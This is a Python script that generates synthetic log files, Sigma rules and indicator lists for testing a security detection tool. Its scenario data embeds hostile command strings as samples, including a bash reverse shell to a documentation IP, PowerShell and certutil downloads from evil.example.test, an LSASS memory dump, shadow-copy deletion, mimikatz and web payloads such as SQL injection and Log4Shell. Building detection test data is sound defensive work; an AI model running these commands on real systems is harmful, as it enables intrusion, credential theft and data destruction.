"""Generate the TraceForge scenario pack in ``lab_data/``.

The pack exercises every supported import format and every detection rule with small, deterministic, synthetic files.
All public IPs come from RFC 5737 documentation ranges, all domains use ``example.test``/``example.com`` and all
accounts and hosts are fictional.

    python scripts/generate_scenario_pack.py

Layout produced:
    01_all_scenarios.csv            one canonical CSV that triggers all 17 built-in rules (+ Sigma + IOC with the helpers below)
    02_web_access.log               Apache/nginx combined access log (text parser)
    03_ssh_auth_syslog.log          classic syslog / auth.log (text parser, no year in timestamps)
    04_firewall_keyvalue.log        key=value firewall lines (text parser)
    05_windows_security_sysmon.xml  Windows Event XML: Security + Sysmon
    06_zeek_conn.log                Zeek TSV conn log
    07_cloudtrail.json              AWS CloudTrail records
    08_ecs_nested.ndjson            nested JSON, one event per line (ECS-style field names)
    09_splunk_style_epoch.csv       non-canonical column names and epoch timestamps
    10_data_quality_edge_cases.csv  bad timestamps, invalid IPs, blank rows, extra columns, mixed formats
    11_bundle.zip                   zip archive containing two logs
    12_ssh_auth_syslog.log.gz       gzip-compressed log
    sigma_rules/*.yml               supported Sigma rules plus one the importer must skip with an explanation
    iocs.txt                        indicators to bulk-add (one per line)
"""
from __future__ import annotations

import csv
import gzip
import io
import json
import random
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "lab_data"
rnd = random.Random(11)
UTC = timezone.utc
TUE = datetime(2026, 3, 10, tzinfo=UTC)   # a Tuesday: business-hours scenarios
SAT = datetime(2026, 3, 14, tzinfo=UTC)   # a Saturday: weekend scenarios
COLS = ["timestamp", "src_ip", "dst_ip", "dst_port", "user", "event_type", "host", "message", "status_code", "url", "bytes_out", "command"]


def at(base: datetime, h: int, m: int = 0, s: int = 0) -> datetime:
    return base + timedelta(hours=h, minutes=m, seconds=s)


def row(ts, **kw) -> dict:
    d = {c: "" for c in COLS}
    d["timestamp"] = ts.strftime("%Y-%m-%dT%H:%M:%SZ")
    d.update({k: ("" if v is None else v) for k, v in kw.items()})
    return d


# ------------------------------------------------------------------------------------------------ scenarios
def scenarios() -> dict[str, list[dict]]:
    S: dict[str, list[dict]] = {}

    # --- credential access / initial access
    S["brute_force"] = [row(at(TUE, 9, 0, 30 * i), src_ip="203.0.113.10", user="user-03", event_type="login_failure", host="vpn-gw01",
                            message="Failed password") for i in range(8)]
    S["password_spray"] = [row(at(TUE, 9, 30, 50 * i), src_ip="203.0.113.11", user=f"user-{i + 1:02d}", event_type="login_failure", host="vpn-gw01",
                               message="Failed password") for i in range(7)]
    S["success_after_failures"] = (
        [row(at(TUE, 10, 0, 45 * i), src_ip="198.51.100.20", user="user-04", event_type="login_failure", host="vpn-gw01", message="Failed password") for i in range(4)]
        + [row(at(TUE, 10, 5), src_ip="198.51.100.20", user="user-04", event_type="login_success", host="vpn-gw01", message="Accepted password")])
    S["multi_ip_login"] = [
        row(at(TUE, 11, 0), src_ip="10.0.1.15", user="user-05", event_type="login_success", host="vpn-gw01", message="Accepted password"),
        row(at(TUE, 11, 20), src_ip="192.0.2.99", user="user-05", event_type="login_success", host="vpn-gw01", message="Accepted password")]
    S["off_hours_login"] = [
        row(at(TUE, 2, 40), src_ip="192.0.2.55", user="user-06", event_type="login_success", host="vpn-gw01", message="Accepted password"),
        row(at(SAT, 3, 10), src_ip="10.0.1.20", user="admin", event_type="login_success", host="dc01", message="Logon type 2 (interactive)")]
    S["sensitive_activity"] = [
        row(at(TUE, 13, 0), user="svc_tmp", event_type="account_created", host="dc01", message="Account svc_tmp created by admin"),
        row(at(TUE, 13, 2), user="svc_tmp", event_type="group_add", host="dc01", message="svc_tmp added to group Administrators by admin"),
        row(at(TUE, 13, 30), user="admin", event_type="log_cleared", host="dc01", message="The audit log was cleared")]
    S["mfa_fatigue"] = (
        [row(at(TUE, 14, 0, 60 * i), src_ip="192.0.2.77", user="user-07", event_type="mfa_denied", host="idp01", message="MFA push denied") for i in range(6)]
        + [row(at(TUE, 14, 8), src_ip="192.0.2.77", user="user-07", event_type="login_success", host="idp01", message="Accepted password + MFA approved")])

    # --- web
    paths = ["/admin", "/wp-login.php", "/.env", "/phpmyadmin", "/backup.zip", "/config.php", "/login", "/server-status", "/.git/config", "/api/v1/users"]
    S["web_scan"] = [row(at(TUE, 15, 0, 6 * i), src_ip="203.0.113.30", event_type="web_request", host="web01", status_code=404 if i % 4 else 403,
                         url=paths[i % len(paths)] + (f"?x={i}" if i >= 10 else ""), message="GET") for i in range(20)]
    payloads = [("/search?q=1' UNION SELECT username,password FROM users--", 500), ("/comment?c=<script>alert(1)</script>", 200),
                ("/download?file=../../../../etc/passwd", 403), ("/ping?host=8.8.8.8;cat /etc/passwd", 500),
                ("/api/login?u=${jndi:ldap://evil.example.test/a}", 400)]
    S["web_attack_payload"] = [row(at(TUE, 15, 20, 20 * i), src_ip="203.0.113.31", event_type="web_request", host="web01", status_code=code, url=u, message="GET")
                               for i, (u, code) in enumerate(payloads)]

    # --- endpoint
    ws = "ws-fin07"
    cmds = [
        ("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=", "user-08"),
        ("powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.example.test/a.ps1')", "user-08"),
        ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full", "user-08"),
        ("vssadmin.exe delete shadows /all /quiet", "user-08"),
        ("bash -i >& /dev/tcp/198.51.100.150/4444 0>&1", "user-08"),
        ("net group \"Domain Admins\" /domain", "user-08"),
    ]
    S["suspicious_command"] = [row(at(TUE, 16, 2 * i), user=u, event_type="process_exec", host=ws, command=c, message=f"Image=C:\\Windows\\System32\\{c.split()[0]} ParentImage=C:\\Windows\\explorer.exe")
                               for i, (c, u) in enumerate(cmds)]
    S["persistence_mechanism"] = [
        row(at(TUE, 17, 0), user="user-08", event_type="process_exec", host=ws, command='schtasks.exe /create /tn "Updater" /tr C:\\temp\\u.exe /sc minute /mo 5', message="Image=C:\\Windows\\System32\\schtasks.exe"),
        row(at(TUE, 17, 2), user="user-08", event_type="process_exec", host=ws, command="sc.exe create UpdSvc binPath= C:\\temp\\u.exe start= auto", message="Image=C:\\Windows\\System32\\sc.exe"),
        row(at(TUE, 17, 4), user="user-08", event_type="process_exec", host=ws, command='reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\temp\\u.exe', message="Image=C:\\Windows\\System32\\reg.exe"),
        row(at(TUE, 17, 6), user="svc_tmp", event_type="service_install", host="srv-app01", message="Service installed: UpdSvc", command="C:\\temp\\u.exe")]
    S["office_spawns_shell"] = [row(at(TUE, 17, 30), user="user-09", event_type="process_exec", host="ws-hr02", command="cmd.exe /c whoami /all",
                                    message="Image=C:\\Windows\\System32\\cmd.exe ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE ParentCommandLine=\"WINWORD.EXE\" /n invoice.docm")]
    hosts = ["srv-app01", "srv-db01", "srv-file01", "srv-web02", "srv-mail01"]
    S["lateral_movement"] = (
        [row(at(TUE, 18, i), src_ip="10.0.2.55", user="svc-backup", event_type="login_success", host=h, message="Logon type 3 (network)") for i, h in enumerate(hosts)]
        + [row(at(TUE, 18, 20), user="svc-backup", event_type="process_exec", host="srv-file01", command="psexec.exe \\\\srv-db01 -s cmd.exe", message="Image=C:\\Tools\\psexec.exe")])

    # --- network
    S["port_scan"] = [row(at(TUE, 19, 0, 4 * i), src_ip="203.0.113.40", dst_ip="10.0.0.5", dst_port=20 + i * 7, event_type="firewall_block", host="fw01", message="DROP") for i in range(25)]
    S["large_outbound"] = [row(at(TUE, 19, 30 + 8 * i), src_ip="10.0.5.20", dst_ip="198.51.100.200", dst_port=443, event_type="network_flow", host="fw01",
                               bytes_out=25_000_000, message="ALLOW") for i in range(3)]
    S["beaconing"] = [row(at(TUE, 20, 0, 60 * i + rnd.choice([-2, -1, 0, 1, 2])), src_ip="10.0.1.42", dst_ip="198.51.100.150", dst_port=8443, event_type="network_flow",
                          host="ws-fin07", bytes_out=300 + i, message="ALLOW") for i in range(12)]

    # --- threat intel: events that carry the values listed in iocs.txt
    S["ioc_match"] = [
        row(at(TUE, 21, 0), src_ip="198.51.100.250", dst_ip="10.0.0.9", dst_port=22, event_type="firewall_allow", host="fw01", message="ALLOW"),
        row(at(TUE, 21, 5), src_ip="203.0.113.60", event_type="web_request", host="web01", status_code=200, url="http://evil.example.test/payload.bin", message="GET"),
        row(at(TUE, 21, 10), user="user-08", event_type="process_exec", host=ws, command="C:\\temp\\tool.exe --hash 44d88612fea8a8f36de82e1278abb02f", message="Image=C:\\temp\\tool.exe"),
        row(at(TUE, 21, 15), user="svc_tmp", event_type="login_success", src_ip="10.0.1.77", host="srv-app01", message="Logon type 3 (network)")]

    # --- sigma: matches sigma_rules/rclone_exfil_tool.yml and sigma_rules/internal_to_outbound_ssh.yml
    S["sigma_match"] = [
        row(at(TUE, 22, 0), user="user-08", event_type="process_exec", host=ws, command="rclone.exe copy C:\\Users\\user-08\\Documents remote:dump", message="Image=C:\\temp\\rclone.exe"),
        row(at(TUE, 22, 10), src_ip="10.0.1.99", dst_ip="203.0.113.99", dst_port=22, event_type="network_flow", host="fw01", message="ALLOW", bytes_out=2000)]

    # --- benign background so rules have something to ignore
    bg = []
    for i in range(30):
        bg.append(row(at(TUE, 9 + i // 6, 7 * (i % 6)), src_ip=f"10.0.1.{10 + i % 8}", user=f"user-{(i % 9) + 1:02d}", event_type="login_success", host="dc01", message="Logon type 2 (interactive)"))
    S["benign_background"] = bg
    return S


def sorted_rows(rows: list[dict]) -> list[dict]:
    return sorted(rows, key=lambda r: (r["timestamp"], r["event_type"], r["src_ip"]))


# ------------------------------------------------------------------------------------------------ writers
def _write(path: Path, text: str) -> None:
    """Write text as UTF-8 with LF line endings on every OS (Path.write_text would emit CRLF on Windows)."""
    path.write_bytes(text.encode("utf-8"))


def w_csv(path: Path, rows: list[dict], cols=COLS) -> None:
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore", lineterminator="\n")
        w.writeheader()
        w.writerows(rows)


def apache_line(r: dict) -> str:
    ts = datetime.strptime(r["timestamp"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=UTC).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{r["src_ip"]} - - [{ts}] "GET {r["url"]} HTTP/1.1" {r["status_code"]} {rnd.randint(200, 5000)} "-" "Mozilla/5.0 (X11; Linux x86_64)"'


def web_access_log(S) -> str:
    lines = [apache_line(r) for r in S["web_scan"] + S["web_attack_payload"]]
    for i in range(25):                                              # benign traffic
        lines.append(apache_line(row(at(TUE, 8 + i // 5, 11 * (i % 5)), src_ip=f"192.0.2.{20 + i % 6}", url=["/", "/index.html", "/products", "/about", "/contact"][i % 5], status_code=200)))
    lines.sort(key=lambda s: datetime.strptime(s.split("[")[1].split("]")[0], "%d/%b/%Y:%H:%M:%S %z"))
    return "\n".join(lines) + "\n"


def ssh_syslog() -> str:
    out = []
    for i in range(8):                                               # brute force on one account
        t = at(TUE, 3, 0, 20 * i)
        out.append(f"{t:%b} {t.day:>2} {t:%H:%M:%S} bastion01 sshd[2211]: Failed password for root from 203.0.113.12 port {40000 + i} ssh2")
    for i, u in enumerate(["oracle", "postgres", "ubuntu", "git", "test", "deploy"]):   # spray: many names, same source
        t = at(TUE, 3, 10, 30 * i)
        out.append(f"{t:%b} {t.day:>2} {t:%H:%M:%S} bastion01 sshd[2230]: Failed password for invalid user {u} from 203.0.113.13 port {41000 + i} ssh2")
    t = at(TUE, 3, 12)
    out.append(f"{t:%b} {t.day:>2} {t:%H:%M:%S} bastion01 sshd[2299]: Accepted password for root from 203.0.113.12 port 40100 ssh2")
    t = at(TUE, 9, 15)
    out.append(f"{t:%b} {t.day:>2} {t:%H:%M:%S} bastion01 sshd[2400]: Accepted publickey for user-02 from 10.0.1.31 port 52000 ssh2")
    t = at(TUE, 9, 20)
    out.append(f"{t:%b} {t.day:>2} {t:%H:%M:%S} bastion01 useradd[2410]: new user: name=svc_tmp, UID=1099")
    out.sort(key=lambda s: (s[:3], int(s[4:6]), s[7:15]))
    return "\n".join(out) + "\n"


def firewall_kv() -> str:
    lines = []
    for i in range(22):                                              # port scan, dropped
        t = at(TUE, 4, 0, 5 * i)
        lines.append(f"{t:%Y-%m-%dT%H:%M:%SZ} fw01 action=DROP src=203.0.113.41 dst=10.0.0.7 proto=TCP dpt={21 + i * 11}")
    for i in range(6):
        t = at(TUE, 4, 30, 30 * i)
        lines.append(f"{t:%Y-%m-%dT%H:%M:%SZ} fw01 action=ALLOW src=10.0.1.15 dst=192.0.2.80 proto=TCP dpt=443 bytes={5000 + i}")
    lines.append(f"{at(TUE, 5, 0):%Y-%m-%dT%H:%M:%SZ} fw01 action=ALLOW src=10.0.5.21 dst=198.51.100.201 proto=TCP dpt=443 bytes=60000000")
    return "\n".join(sorted(lines)) + "\n"


def evt(eid, ts, channel, provider, computer, data: dict) -> str:
    d = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="{provider}"/><EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{ts:%Y-%m-%dT%H:%M:%S}.000000000Z"/><Channel>{channel}</Channel><Computer>{computer}</Computer></System><EventData>{d}</EventData></Event>')


def windows_xml() -> str:
    SEC, SYS = ("Security", "Microsoft-Windows-Security-Auditing"), ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
    ev = []
    for i in range(7):                                               # 4625 brute force
        ev.append(evt(4625, at(TUE, 6, 0, 25 * i), *SEC, "dc01.corp.local", {"TargetUserName": "administrator", "LogonType": "3", "IpAddress": "203.0.113.14", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "-"}))
    ev.append(evt(4624, at(TUE, 6, 5), *SEC, "dc01.corp.local", {"TargetUserName": "administrator", "LogonType": "3", "IpAddress": "203.0.113.14", "WorkstationName": "-", "ProcessName": "-"}))
    for i, h in enumerate(["srv-a1", "srv-a2", "srv-a3", "srv-a4", "srv-a5"]):   # lateral movement via network logons
        ev.append(evt(4624, at(TUE, 6, 30 + i), *SEC, f"{h}.corp.local", {"TargetUserName": "svc-deploy", "LogonType": "3", "IpAddress": "10.0.3.9", "WorkstationName": "WS-ADMIN3", "ProcessName": "-"}))
    ev.append(evt(4720, at(TUE, 7, 0), *SEC, "dc01.corp.local", {"TargetUserName": "svc_tmp", "SubjectUserName": "administrator"}))
    ev.append(evt(4732, at(TUE, 7, 1), *SEC, "dc01.corp.local", {"MemberName": "CN=svc_tmp,OU=Service,DC=corp,DC=local", "TargetUserName": "Administrators", "SubjectUserName": "administrator"}))
    ev.append(evt(7045, at(TUE, 7, 5), "System", "Service Control Manager", "srv-app01.corp.local", {"ServiceName": "UpdSvc", "ImagePath": "C:\\temp\\u.exe", "AccountName": "LocalSystem"}))
    ev.append(evt(4698, at(TUE, 7, 8), *SEC, "srv-app01.corp.local", {"TaskName": "\\Updater", "SubjectUserName": "svc_tmp", "TaskContent": "&lt;Task&gt;&lt;Exec&gt;&lt;Command&gt;C:\\temp\\u.exe&lt;/Command&gt;&lt;Arguments&gt;-s&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Task&gt;"}))
    ev.append(evt(1102, at(TUE, 7, 20), *SEC, "dc01.corp.local", {"SubjectUserName": "administrator"}))
    # Sysmon: process creation, network connection, registry
    ev.append(evt(1, at(TUE, 8, 0), *SYS, "ws-hr02.corp.local", {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                                                               "CommandLine": "cmd.exe /c certutil -urlcache -f http://evil.example.test/a.exe a.exe", "ParentCommandLine": "EXCEL.EXE budget.xlsm", "User": "CORP\\user-09"}))
    ev.append(evt(1, at(TUE, 8, 3), *SYS, "ws-hr02.corp.local", {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\explorer.exe",
                                                               "CommandLine": "powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=", "ParentCommandLine": "explorer.exe", "User": "CORP\\user-09"}))
    ev.append(evt(1, at(TUE, 8, 6), *SYS, "ws-hr02.corp.local", {"Image": "C:\\Tools\\mimikatz.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "mimikatz.exe sekurlsa::logonpasswords", "ParentCommandLine": "cmd.exe", "User": "CORP\\user-09"}))
    for i in range(10):
        ev.append(evt(3, at(TUE, 8, 10 + i), *SYS, "ws-hr02.corp.local", {"Image": "C:\\Users\\user-09\\AppData\\u.exe", "SourceIp": "10.0.4.12", "DestinationIp": "198.51.100.151", "DestinationPort": "8443", "Protocol": "tcp", "User": "CORP\\user-09"}))
    ev.append(evt(13, at(TUE, 8, 30), *SYS, "ws-hr02.corp.local", {"Image": "C:\\Windows\\System32\\reg.exe", "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Upd", "Details": "C:\\temp\\u.exe", "User": "CORP\\user-09"}))
    ev.sort(key=lambda s: s.split('SystemTime="')[1][:19])
    return '<?xml version="1.0" encoding="utf-8"?>\n' + "\n".join(ev) + "\n"


def zeek_conn() -> str:
    head = ("#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\tconn\n#open\t2026-03-10-12-00-00\n"
            "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\tduration\torig_bytes\tresp_bytes\tconn_state\n"
            "#types\ttime\tstring\taddr\tport\taddr\tport\tenum\tstring\tinterval\tcount\tcount\tstring\n")
    base = int(at(TUE, 12).timestamp())
    lines = []
    for i in range(14):                                              # beacon: 90 s +/- 3 s to an external host
        lines.append(f"{base + 90 * i + rnd.choice([-3, -1, 0, 2, 3])}.000000\tCb{i}\t10.0.6.30\t{50000 + i}\t198.51.100.152\t443\ttcp\tssl\t0.3\t310\t910\tSF")
    for i in range(20):                                              # horizontal/vertical scan
        lines.append(f"{base + 2000 + 3 * i}.000000\tCs{i}\t203.0.113.42\t{60000 + i}\t10.0.6.5\t{1000 + i * 13}\ttcp\t-\t0.0\t0\t0\tS0")
    for i in range(6):                                               # ordinary traffic
        lines.append(f"{base + 3000 + 40 * i}.000000\tCn{i}\t10.0.6.31\t{51000 + i}\t192.0.2.8\t443\ttcp\tssl\t0.4\t500\t1500\tSF")
    lines.sort(key=lambda s: float(s.split("\t")[0]))
    return head + "\n".join(lines) + "\n#close\t2026-03-10-13-00-00\n"


def cloudtrail() -> str:
    def rec(ts, name, src="signin.amazonaws.com", ip="203.0.113.50", user="devops1", **extra):
        r = {"eventTime": ts.strftime("%Y-%m-%dT%H:%M:%SZ"), "eventSource": src, "eventName": name, "awsRegion": "us-east-1", "sourceIPAddress": ip,
             "userAgent": "aws-cli/2.15", "userIdentity": {"type": "IAMUser", "userName": user, "arn": f"arn:aws:iam::123456789012:user/{user}"}}
        r.update(extra)
        return r
    R = []
    for i in range(6):
        R.append(rec(at(TUE, 1, 0, 40 * i), "ConsoleLogin", responseElements={"ConsoleLogin": "Failure"}, additionalEventData={"MFAUsed": "No"}))
    R.append(rec(at(TUE, 1, 6), "ConsoleLogin", responseElements={"ConsoleLogin": "Success"}, additionalEventData={"MFAUsed": "No"}))
    R.append(rec(at(TUE, 1, 15), "CreateUser", src="iam.amazonaws.com", requestParameters={"userName": "backdoor-user"}))
    R.append(rec(at(TUE, 1, 16), "AttachUserPolicy", src="iam.amazonaws.com", requestParameters={"userName": "backdoor-user", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}))
    R.append(rec(at(TUE, 1, 20), "StopLogging", src="cloudtrail.amazonaws.com", requestParameters={"name": "org-trail"}))
    R.append(rec(at(TUE, 1, 25), "GetObject", src="s3.amazonaws.com", errorCode="AccessDenied", errorMessage="Access Denied"))
    R.append(rec(at(TUE, 10, 0), "ConsoleLogin", ip="10.0.1.15", user="analyst1", responseElements={"ConsoleLogin": "Success"}, additionalEventData={"MFAUsed": "Yes"}))
    return json.dumps({"Records": R}, indent=1) + "\n"


def ecs_ndjson() -> str:
    out = []
    for i in range(9):
        t = at(TUE, 5, 0, 30 * i)
        out.append({"@timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": {"ip": "203.0.113.16"}, "user": {"name": "user-10"}, "event": {"action": "login-failed"},
                    "host": {"name": "sso01"}, "message": "authentication failed"})
    t = at(TUE, 5, 6)
    out.append({"@timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": {"ip": "203.0.113.16"}, "user": {"name": "user-10"}, "event": {"action": "login-success"}, "host": {"name": "sso01"}})
    for i in range(4):
        t = at(TUE, 9, 10 * i)
        out.append({"@timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": {"ip": f"10.0.1.{40 + i}"}, "user": {"name": f"user-0{i + 1}"}, "event": {"action": "login-success"}, "host": {"name": "sso01"}})
    return "\n".join(json.dumps(o) for o in out) + "\n"


def splunk_epoch() -> str:
    cols = ["_time", "src", "dest_ip", "dport", "account", "action", "bytes"]
    rows = []
    base = int(at(TUE, 23).timestamp())
    for i in range(18):                                              # port scan seen as 'blocked'
        rows.append([base + 4 * i, "203.0.113.43", "10.0.7.5", 2000 + i * 17, "", "blocked", 0])
    for i in range(3):                                               # large upload
        rows.append([base + 600 + 300 * i, "10.0.7.20", "198.51.100.202", 443, "", "allowed", 22_000_000])
    for i in range(5):
        rows.append([base + 1500 + 20 * i, "198.51.100.30", "10.0.7.9", 22, "user-03", "failed_login", 0])
    buf = io.StringIO()
    w = csv.writer(buf, lineterminator="\n")
    w.writerow(cols)
    w.writerows(sorted(rows))
    return buf.getvalue()


def edge_cases() -> str:
    h = "timestamp,src_ip,dst_ip,user,event_type,message,extra_notes,ticket_id\n"
    body = [
        "2026-03-10T09:00:00Z,10.0.0.5,10.0.0.9,user-01,login_success,valid row,keeps extra columns,T-1",
        "2026-03-10 09:01:00,10.0.0.5,10.0.0.9,user-01,login_success,space separator instead of T,,T-2",
        "2026-03-10T14:32:00+05:30,10.0.0.6,10.0.0.9,user-02,login_success,offset converted to UTC (09:02Z),,T-3",
        "10/Mar/2026:09:03:00 +0000,10.0.0.7,10.0.0.9,user-03,login_success,apache-style stamp inside a CSV timestamp column is not parsed: counted and dropped,,T-4",
        "1773133440,10.0.0.8,10.0.0.9,user-04,login_success,epoch string inside the timestamp column is not parsed: counted and dropped,,T-5",
        "not-a-date,10.0.0.9,10.0.0.9,user-05,login_failure,bad timestamp: counted then dropped,,T-6",
        ",10.0.0.9,10.0.0.9,user-05,login_failure,empty timestamp: counted then dropped,,T-7",
        "2026-03-10T09:06:00Z,999.999.1.1,10.0.0.9,user-06,login_failure,invalid source IP is cleared and counted,,T-8",
        "2026-03-10T09:07:00Z,,,user-07,login_failure,no network fields at all,,T-9",
        "2026-03-10T09:08:00Z,2001:db8::1,10.0.0.9,user-08,login_success,IPv6 source,,T-10",
        "",
        "2026-03-10T09:09:00Z,10.0.0.10,10.0.0.9,  USER-09  ,LOGIN_SUCCESS,whitespace and case normalised,,T-11",
        '2026-03-10T09:10:00Z,10.0.0.11,10.0.0.9,user-10,login_success,"comma, inside a quoted message",,T-12',
        "2026-03-10T09:11:00Z,10.0.0.12,10.0.0.9,usér-11,login_success,unicode in user name,,T-13",
    ]
    return h + "\n".join(body) + "\n"


SIGMA = {
    "rclone_exfil_tool.yml": """title: Rclone Used To Copy Data To Remote Storage
id: 5a3d1c10-0000-4000-8000-000000000001
status: experimental
description: Detects use of rclone to copy local data to a remote target
tags: [attack.exfiltration, attack.t1567.002]
level: high
falsepositives: [Approved backup jobs]
detection:
  selection:
    CommandLine|contains|all: ['rclone', ' copy ']
  condition: selection
""",
    "internal_to_outbound_ssh.yml": """title: Internal Host Opens Outbound SSH
id: 5a3d1c10-0000-4000-8000-000000000002
status: experimental
description: Outbound SSH from a private address to a public one
tags: [attack.command_and_control, attack.t1572]
level: medium
detection:
  selection:
    dst_port: 22
    src_ip|cidr: ['10.0.0.0/8', '192.168.0.0/16']
  filter_internal:
    dst_ip|cidr: ['10.0.0.0/8', '192.168.0.0/16']
  condition: selection and not filter_internal
""",
    "unsupported_aggregation.yml": """title: Aggregation Rule (importer must skip this with a reason)
id: 5a3d1c10-0000-4000-8000-000000000003
level: low
detection:
  selection:
    EventID: 4625
  condition: selection | count() by IpAddress > 10
""",
}

IOCS = """198.51.100.250
evil.example.test
44d88612fea8a8f36de82e1278abb02f
svc_tmp
http://evil.example.test/payload.bin
analyst-phish@example.test
"""


def main() -> None:
    OUT.mkdir(exist_ok=True)
    (OUT / "sigma_rules").mkdir(exist_ok=True)
    S = scenarios()
    allrows = sorted_rows([r for k, v in S.items() for r in v])
    w_csv(OUT / "01_all_scenarios.csv", allrows)
    _write(OUT / "02_web_access.log", web_access_log(S))
    sys_log = ssh_syslog()
    _write(OUT / "03_ssh_auth_syslog.log", sys_log)
    fw = firewall_kv()
    _write(OUT / "04_firewall_keyvalue.log", fw)
    _write(OUT / "05_windows_security_sysmon.xml", windows_xml())
    _write(OUT / "06_zeek_conn.log", zeek_conn())
    _write(OUT / "07_cloudtrail.json", cloudtrail())
    _write(OUT / "08_ecs_nested.ndjson", ecs_ndjson())
    _write(OUT / "09_splunk_style_epoch.csv", splunk_epoch())
    _write(OUT / "10_data_quality_edge_cases.csv", edge_cases())
    with zipfile.ZipFile(OUT / "11_bundle.zip", "w", zipfile.ZIP_DEFLATED) as z:
        for name, text in (("web_access.log", web_access_log(S)), ("firewall.log", fw)):
            zi = zipfile.ZipInfo(name, date_time=(2026, 3, 10, 0, 0, 0))
            zi.compress_type = zipfile.ZIP_DEFLATED
            z.writestr(zi, text)
    with open(OUT / "12_ssh_auth_syslog.log.gz", "wb") as raw, gzip.GzipFile(filename="", mode="wb", fileobj=raw, mtime=0) as g:
        g.write(sys_log.encode("utf-8"))
    for name, text in SIGMA.items():
        _write(OUT / "sigma_rules" / name, text)
    _write(OUT / "iocs.txt", IOCS)
    print("wrote", len(list(OUT.rglob("*"))), "paths to", OUT)


if __name__ == "__main__":
    main()
